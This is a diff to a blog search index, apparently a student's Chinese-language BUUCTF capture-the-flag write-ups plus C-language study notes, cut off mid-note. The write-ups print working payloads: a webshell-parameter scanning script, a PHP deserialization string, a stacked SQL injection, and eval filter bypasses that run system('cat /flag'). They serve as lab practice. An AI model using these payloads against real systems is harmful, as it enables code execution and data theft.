@@ -1,12 +1,395 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>强网杯 2019高明的黑客</title>
+    <url>/2021/07/26/buu/1/</url>
+    <content><![CDATA[<p><img src="/2021/07/26/buu/1/image-20210726102939511.png" alt="image-20210726102939511"></p>
+<p>打开靶机后，网页提示下载源码：<a href="http://www.tar.gz/">www.tar.gz</a> </p>
+<p>猜测里面包含可以利用的漏洞文件。</p>
+<p>然后开始了漫长的下载。。。</p>
+<p>下载完成后，我们发现里面包含的文件挺多的，而且是很多都为木马文件，所以排除了用360侦测出目标文件。</p>
+<p>查看某些文件发现可以利用GET和POST传参利用。</p>
+<p>找到大佬写的脚本，用python来跑就不用一个个试了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1&#x3D;threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;soft&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;src&#x2F;&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files &#x3D; os.listdir(filePath)</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">session.keep_alive &#x3D; False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;														#所有的$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;src&#x2F;&#39;+file</span><br><span class="line">    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag &#x3D;&#x3D; 1:													#flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param &#x3D; a</span><br><span class="line">        else:</span><br><span class="line">            param &#x3D; b</span><br><span class="line">        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/buu/1/image-20210726114732836.png" alt="image-20210726114732836"></p>
+<p>真的太膜拜了，单线程的脚本我都不会写。。。</p>
+<p>如图找到了可利用参数和文件</p>
+<p>接下来就是进行访问对应文件来进行利用</p>
+<p>结果如图</p>
+<p><img src="/2021/07/26/buu/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(301).png" alt="屏幕截图(301)"></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯 2020 青龙组AreUSerialz</title>
+    <url>/2021/07/26/buu/2/</url>
+    <content><![CDATA[<p>​    打开后，出现代码页面</p>
+<p><img src="/2021/07/26/buu/2/image-20210726194801767.png" alt="image-20210726194801767"></p>
+<p>​    处理到vs上</p>
+<p><img src="/2021/07/26/buu/2/image-20210726194850909.png" alt="image-20210726194850909"></p>
+<p>接着我们逐段分析：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​    包含了名为flag.php的文件。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected $op;</span><br><span class="line"></span><br><span class="line">protected $filename;</span><br><span class="line"></span><br><span class="line">protected $content;</span><br></pre></td></tr></table></figure>
+
+<p>​    受保护方法的三个变量</p>
+<p>接下来是借鉴了大佬博客</p>
+<p>经过分析，这个题目需要传入一个序列化之后的类对象（因为最后的valid函数会进行一步反序列化），并且要绕过两层防护：</p>
+<p>两个防护：<br><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line"></span><br><span class="line">  for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">​    if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line"></span><br><span class="line">​      return false;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用到了python的ord函数：</p>
+<p>[^]: ord () 函数是 chr () 函数（对于8位的ASCII字符串）或 unichr () 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p>
+<p>绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
+<p><strong>destruct()魔术方法</strong><br>op===”2”，是强比较，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p> <strong>而在process()函数中,</strong></p>
+<p>op==”2”是弱比较</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p> 绕过方法：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p>
+<p><img src="/2021/07/26/buu/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>绕过之后，就是到了关键一步，要进行本地序列化操作：</p>
+<p>我直接照搬了大佬的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public  $op &#x3D; 2;</span><br><span class="line">    public  $filename &#x3D; &quot;flag.php&quot;;</span><br><span class="line">    public  $content &#x3D; &quot;1&quot;;        &#x2F;&#x2F;因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileHandler();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问xu.php</p>
+<p><img src="/2021/07/26/buu/2/image-20210726200434420.png" alt="image-20210726200434420"></p>
+<p>​        构建payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        F12得到flag：</p>
+<p><img src="/2021/07/26/buu/2/image-20210726200827967.png" alt="image-20210726200827967"></p>
+<p>本文借鉴于：[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">网鼎杯 2020 青龙组]AreUSerialz_RABCDXB的博客-CSDN博客</a></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MRCTF2020 Ez_bypass&amp;GYCTF2020 Blacklist</title>
+    <url>/2021/07/27/buu/3/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>打开靶机：</p>
+<p><img src="/2021/07/27/buu/3/image-20210727172208110.png" alt="image-20210727172208110"></p>
+<p>按照提示</p>
+<p>进入f12中</p>
+<p><img src="/2021/07/27/buu/3/image-20210727172249158.png" alt="image-20210727172249158"></p>
+<p>代码审计一下：</p>
+<p>里面包含了名为flag.php的文件，flag的格式也进行了说明</p>
+<p>接下来要处理两个变量，gg和id</p>
+<p>第一个if判断的是两个变量md5值相同但是其本身却不能相等</p>
+<p>我查找到了有关资料</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5不能处理数组，处理任意数组返回值都相同</span><br></pre></td></tr></table></figure>
+
+<p>所以我们直接这样赋值</p>
+<p>?id[]=1&amp;gg[]=2</p>
+<p>成功达成第一个条件：</p>
+<p><img src="/2021/07/27/buu/3/image-20210727172710626.png" alt="image-20210727172710626"></p>
+<p>接着看看第二个if需要完成什么</p>
+<p>提示我们POST传参passwd变量</p>
+<p>其值不能为数字型</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;是恒等计算符  同时检查表达式的值与类型</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;是比较运算符号  不会检查条件式的表达式的类型</span><br></pre></td></tr></table></figure>
+
+<p>之后的比较同样满足条件。思路有了，</p>
+<p>不过我做法错了，跟以前弱口令什么的混起来了，疯狂尝试了‘123456a’无果</p>
+<p>看了wp后才知道，其实不用加分号，直接passwd=1234567a，这里已经是字符型了。</p>
+<p>一剑封喉：</p>
+<p><img src="/2021/07/27/buu/3/image-20210727173223649.png" alt="image-20210727173223649"></p>
+<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>打开靶机后，明显注入题。</p>
+<p><img src="/2021/07/27/buu/3/image-20210727204621570.png" alt="image-20210727204621570"></p>
+<p>wp来源：<a href="https://www.cnblogs.com/20175211lyz/p/12356678.html">https://www.cnblogs.com/20175211lyz/p/12356678.html</a></p>
+<h4 id="姿势-堆叠注入"><a href="#姿势-堆叠注入" class="headerlink" title="姿势-堆叠注入"></a>姿势-堆叠注入</h4><p>获取库名、表名、列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from &#96;table_name&#96;;</span><br></pre></td></tr></table></figure>
+
+<p>试着查询了一下数据库名、表名和段名（<strong>这里没有用之前传统的联合查询，因为自己尝试查询之后发现后面会被正则表达式过滤</strong>）：</p>
+<p>ps：不过我不太清楚为什么这里查询要 ‘ 加上 ；</p>
+<p><img src="/2021/07/27/buu/3/image-20210727204959368.png" alt="image-20210727204959368"></p>
+<p><img src="/2021/07/27/buu/3/image-20210727205248791.png" alt="image-20210727205248791"></p>
+<p>出现了flag字样，然后用大佬的方法，</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>
+
+<p>官方解释是：</p>
+<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，</p>
+<p>该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
+<h4 id="Tip："><a href="#Tip：" class="headerlink" title="Tip："></a>Tip：</h4><p>本来应该还有一种姿势是修改表名，但是修改表名的关键字rename和alert都被正则ban掉，所以不能用</p>
+<p>这题若是改造之前的强网杯2019随便注一题则可以用此方法。</p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CISCN 2019 初赛	Love Math</title>
+    <url>/2021/07/30/buu/4/</url>
+    <content><![CDATA[<p>​    这是一道非常好的绕过题目。</p>
+<p><img src="/2021/07/30/buu/4/image-20210730151757624.png" alt="image-20210730151757624"></p>
+<p>附上源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析：白名单里有些函数</p>
+<h5 id="base-convert："><a href="#base-convert：" class="headerlink" title="base_convert："></a><strong>base_convert</strong>：<img src="/2021/07/30/buu/4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NodDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h5><h5 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h5><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
+<h5 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex() 函数"></a>dechex() 函数</h5><p>dechex() 函数把十进制数转换为十六进制数。</p>
+<p>目标：执行system函数来完成查看flag的操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;system(&quot;cat &#x2F;flag&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>但是上面列出来白名单和黑名单，关键字符会被过滤，要求我们绕过。</p>
+<p>比如这样就是被过滤了：</p>
+<p><img src="/2021/07/30/buu/4/image-20210802091253839.png" alt="image-20210802091253839"></p>
+<p>我们不能输入引号和system函数</p>
+<p>但引号去掉也可执行，然后再采用变量保存函数和参数。</p>
+<p>且用白名单里的函数代替得</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>不过，_GET并没有在白名单内,[ ]也被过滤。</p>
+<p>所以</p>
+<p>1.[ ]可以用{}替换</p>
+<p>2._GET用hex2bin转换</p>
+<p><a href="https://www.rapidtables.org/zh-CN/convert/number/ascii-to-hex.html">ASCII到十六进制| 文本到十六进制代码转换器 (rapidtables.org)</a></p>
+<p><img src="/2021/07/30/buu/4/image-20210802092247741.png" alt="image-20210802092247741"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)</span><br></pre></td></tr></table></figure>
+
+<p>  这里用到的hex2bin也是名单之外</p>
+<p>  需要用base_convert函数转换</p>
+<p>（用base_convert()函数将10进制数转化为32进制的hex2bin）</p>
+<p><a href="https://tool.oschina.net/hexconvert">在线进制转换 (oschina.net)</a></p>
+<p><img src="/2021/07/30/buu/4/image-20210802092841841.png" alt="image-20210802092841841"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hex2bin&#x3D;base_convert(37907361743,10,36)</span><br></pre></td></tr></table></figure>
+
+<p>数字也不能直接填</p>
+<p>因为之前的正则表达式会过滤掉。</p>
+<p><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> 这句话当作函数名放进白名单里检测</p>
+<p>所以<code>5f 47 45 54</code>需要转换</p>
+<p>而dechex() 函数把十进制数转换为十六进制数。</p>
+<p><img src="/2021/07/30/buu/4/image-20210802093324856.png" alt="image-20210802093324856"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5f474554&#96;&#x3D;&#96;dechex(1598506324)</span><br></pre></td></tr></table></figure>
+
+<p>所以有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)&#x3D;base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure>
+
+<p>接着将_GET存在一个变量里：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/30/buu/4/image-20210802094315328.png" alt="image-20210802094315328"></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C语言求余问题</title>
+    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
+    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
+<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
+<p>a，b，c，d</p>
+<p>b=a/100；</p>
+<p>c=a/10%10;</p>
+<p>d=a%10;</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GXYCTF2019 禁止套娃</title>
+    <url>/2021/08/01/buu/5/</url>
+    <content><![CDATA[<p>​    靶机启动：</p>
+<p><img src="/2021/08/01/buu/5/image-20210801193338875.png" alt="image-20210801193338875"></p>
+<p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p>
+<p>查看了wp才知道这是git泄露。</p>
+<h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><h4 id="简述-git文件导致的源码泄露"><a href="#简述-git文件导致的源码泄露" class="headerlink" title="简述.git文件导致的源码泄露"></a>简述.git文件导致的源码泄露</h4><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。</p>
+<h4 id="原理利用"><a href="#原理利用" class="headerlink" title="原理利用"></a>原理利用</h4><p>1、通常开发人员在开发时，通常将源码提交到远程的托管网站（如Github）方便管理与交互，等到开发最后阶段，再将源码从远程服务器上下载到 web 目录下， 如果开发人员忘记将其中的 .git文件删除，则可以通过 .git文件恢复网站源码，来获取一些敏感信息；<br>2、开发人员对站点使用 Git 对版本进行控制，实现自动部署，如果配置不当，直接将 .git文件加载到线上环境，这样便引起了.git文件泄露。</p>
+<p>这时候我们用了名为GitHack的工具</p>
+<p>(需要python版本为2打头的，因为作者写的时候估计python解释器是参考python2的所以用python3会报错,下载地址为：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p>
+<p>进行了扫描，获取源文件：</p>
+<p><img src="/2021/08/01/buu/5/image-20210801194006477.png" alt="image-20210801194006477"></p>
+<p><img src="/2021/08/01/buu/5/image-20210801194541670.png" alt="image-20210801194541670"></p>
+<p>源码如下：</p>
+<?php
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+
+<p>我们的最终目的就是绕过之后通过eval函数来查询flag。</p>
+<p>源码分析：</p>
+<ul>
+<li>需要通过<strong>GET</strong>方式传入参数<code>exp</code></li>
+<li>第一层<code>preg_match()</code>函数限制了php伪协议，像封装协议之类的</li>
+<li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li>
+<li>第三层<code>preg_match()</code>限制了一些关键字</li>
+<li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li>
+<li></li>
+</ul>
+<p>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</p>
+<p><img src="/2021/08/01/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p>
+<p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么问题就是如何构造<br>scandir(‘.’)</p>
+<p>这里再看函数：</p>
+<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是 current() 的别名。<br>这里还有一个知识点：</p>
+<p><strong>current(localeconv())永远都是个点</strong></p>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/01/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p>
+<p>之后的读取暂时无法理解，全都照搬了wp</p>
+<p>有时间再理解消化。</p>
+<p><img src="/2021/08/01/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p>
+<p>参考博客：</p>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
+<p> <a href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] 禁止套娃_Senimo-CSDN博客_buuctf 禁止套娃</a></p>
+<p> <a href="https://blog.csdn.net/rfrder/article/details/109627827">GXYCTF2019]禁止套娃 1_feng的博客-CSDN博客</a></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C语言注</title>
+    <url>/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
+    <content><![CDATA[<p>1.(！flag) 等价于 (flag==0)<br>2.while(n)  是什么意思？<br>首先，n在这里被当作了一个条件<br>其次，当n为真时，进入while循环体（A）；否则跳出循环继续执行下面部分（B）。<br>while（n）<br>｛<br>循环体；//标识为A<br>｝<br>语句1；//标识为B<br>语句2；<br>3.如何用C语言将字符型数字转化成数值型数字<br>‘2’       通过     ‘2’ - ’0’ = 2<br>4.对于二维数组如何将什么上三角、下三角的值进行修改<br>考虑对角线很重要<br>比如 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>正三角线：左到右，i=j<br>反三角线：右到左，i+j=n-1<br>取大于等于或者小于等于号时就可以实现上三角之类的数操作</p>
+<p>1 定义语句、执行语句以分号 ；结尾</p>
+<p>2 必须有主函数   main（）</p>
+<p>3 标识符由字母、数字和下画线-组成，</p>
+<p>第一个字符必须是字母或下画线</p>
+<p>4 char字符型                 字符型数据（char），用来储存字符</p>
+<p>​                                       储存内容为字符对于ASCII 码</p>
+<p>5 getchar 是从键盘缓冲区获取一个字符（输入单个字时）</p>
+<p>而putchar是把参数指定的字符变量的字符输出（输出单个字符）</p>
+<p>eg：char ch；</p>
